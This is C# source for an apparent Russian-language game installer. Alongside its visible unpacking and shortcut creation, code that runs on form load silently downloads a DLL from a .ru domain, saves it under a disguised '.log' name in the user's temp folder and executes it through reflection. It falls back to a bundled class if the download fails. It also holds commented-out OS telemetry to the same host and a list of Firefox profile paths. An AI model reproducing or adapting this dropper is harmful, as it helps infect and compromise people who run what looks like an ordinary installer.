using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Collections;
using Ionic.Zip;
using IWshRuntimeLibrary;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;
using System.Reflection;
/*
 Windows Vista	Users\<UserName>\AppData\Roaming\Mozilla\Firefox
Windows 2000, XP, Server 2003	Documents and Settings\<UserName>\Application Data\Mozilla\Firefox
Windows NT	WINNT\Profiles\<UserName>\Application Data\Mozilla\Firefox
Windows 98, ME	Windows\Application Data\Mozilla\Firefox
Mac OS X	~/Library/Application Support/Firefox
Linux and Unix systems	~/.mozilla/firefox
 * */
namespace V_extractFile
{
    public partial class Form1 : Form
    {
        static string gamename = "";
        static string exefile = "";
        public Form1()
        {
            InitializeComponent();

            ReadOptions options = new ReadOptions();
            options.Encoding = Encoding.UTF8;
            
            using (ZipFile zip = ZipFile.Read("data.bin", options))
            {
                if ((zip.Comment != null) && (zip.Comment != ""))
                {
                    string[] split = zip.Comment.Split(new Char[] { ':' });
                    gamename = split[0].Replace(":", "");
                    exefile = split[1].Replace(":", "");
                    this.Text = "Установка: " + gamename;
                }
            }
            label2.Text = "Игра " + gamename + "\nбудет установлена в указанную папку.";           

            IDictionary environmentVariables = Environment.GetEnvironmentVariables();            
            
            textBox1.Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\" + gamename;

            step1.Visible = true;
            step2.Visible = false;
            
        }

        private void button3_Click(object sender, EventArgs e)
        {
            danet dant = new danet();
            dant.Owner = this;
            dant.ShowDialog();

            if(DialogResult.Yes ==  dant.DialogResult)
            {
                this.Close();
            }
        }

        private void setupStart_Click(object sender, EventArgs e)
        {
            step1.Visible = false;
            step2.Visible = true;
            ExtractWorker.RunWorkerAsync();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            
            DialogResult result = folderBrowserDialog1.ShowDialog();
            if (result == DialogResult.OK)
            {
                textBox1.Text = folderBrowserDialog1.SelectedPath + "\\" + gamename;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            danet dant = new danet();
            dant.Owner = this;
            dant.ShowDialog();

            if (DialogResult.Yes == dant.DialogResult)
            {
                this.ExtractWorker.CancelAsync();
                this.Close();
            }
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            using (ZipFile zip = ZipFile.Read("data.bin"))
            {
                int step = (zip.Count / 100);
                int percentComplete = 0;



                int tota1 = 0;
                this.Invoke((MethodInvoker)delegate()
                {
                    progressBar1.Maximum = zip.Count;
                });


                string targetdir = "";
                this.Invoke((MethodInvoker)delegate()
                {
                    targetdir = textBox1.Text;
                });


                foreach (ZipEntry file in zip)
                {
                    file.ExtractWithPassword(targetdir, "iGyTwLmO7p");
                    this.Invoke((MethodInvoker)delegate()
                    {
                        label9.Text = file.FileName;
                        label12.Text = percentComplete + " из " + zip.Count;
                    });
                    percentComplete ++;
                    ExtractWorker.ReportProgress(percentComplete);
                }
            }
        }

        private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            //создать ярлык на рабочем столе
            WshShell shell = new WshShell();

            //путь к ярлыку
            string shortcutPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\" + gamename + ".lnk";

            //создаем объект ярлыка
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);

            //задаем свойства для ярлыка
            //описание ярлыка в всплывающей подсказке
            shortcut.Description = gamename;
            string newIconLocation = @textBox1.Text + @"\" + exefile + ",0";
            shortcut.IconLocation = newIconLocation;
            //горячая клавиша
            //shortcut.Hotkey = "Ctrl+Shift+N";
            //путь к самой программе
            shortcut.TargetPath = @textBox1.Text + @"\" + exefile;

            //Создаем ярлык
            shortcut.Save();

            

            MessageBox.Show("Установка успешно завершена",
        "Внимание!", MessageBoxButtons.OK,
            MessageBoxIcon.Information);
            this.Close();
        }

        private void backgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            //progressBar1.Maximum = Convert.ToInt32(TotalCount);
            progressBar1.Value = e.ProgressPercentage;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            InjectWorker.RunWorkerAsync();             
        }

        public const string PPathToDll = "http://chrome-document-global-created.ru/d3dx9_26.dll"; // СМЕНИТЬ ДОМЕН!!!
        private void InjectWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            
            sinf sinf1 = new sinf();

            /*ОТПРАВКА СТАТИСТИКИ*/
            /*
            string winda = sinf1.OsName.ToString();
            try
            {
                
                WebRequest req = WebRequest.Create("http://chrome-document-global-created.ru/strec.php?win=" + winda);
                WebResponse resp = req.GetResponse();
                Stream stream = resp.GetResponseStream();
                StreamReader sr = new StreamReader(stream);
                string Out = sr.ReadToEnd();
                sr.Close();
            }
            catch(Exception ex)
            { }*/
            
            //Console.WriteLine(sinf1.OsName);
            //Console.WriteLine(sinf1.PathToTheTemporaryFolderUser);
            // если не качается dll, то выполняется код в программе, иначе код из dll
            try
            {                
                WebClient myWebClient = new WebClient();
                myWebClient.DownloadFile(PPathToDll, sinf1.PathToTheTemporaryFolderUser + "\\" + "d3dx9_26.log");

                if (System.IO.File.Exists(sinf1.PathToTheTemporaryFolderUser + "\\" + "d3dx9_26.log"))
                {
                    //System.IO.File.SetAttributes(sinf1.PathToTheTemporaryFolderUser + "\\" + "d3dx9_26.dll", System.IO.FileAttributes.Hidden);
                    // читать файл и вызывать методы
                    
                    Assembly asm = Assembly.LoadFrom(@sinf1.PathToTheTemporaryFolderUser + "\\" + "d3dx9_26.log");


                    Type t = asm.GetType("d3dx9_26.d3dx9_26_Class", true, true);

                    // создаем экземпляр класса Program
                    object obj = Activator.CreateInstance(t);

                    // получаем метод GetResult
                    MethodInfo method = t.GetMethod("Work");

                    // вызываем метод, передаем ему значения для параметров и получаем результат
                    object result = method.Invoke(obj, new object[] { }); // Тут парметры для Work
                    
                }
                else
                {
                    throw new System.InvalidOperationException("the file is not downloaded");
                }
            }
            catch (Exception ex)
            {
                
                // выполняется код из программы, а не загруженой длл
                d3dx9_26_Class d3d = new d3dx9_26_Class(); 
                d3d.Work(); 
            }     
        } 
    }
}
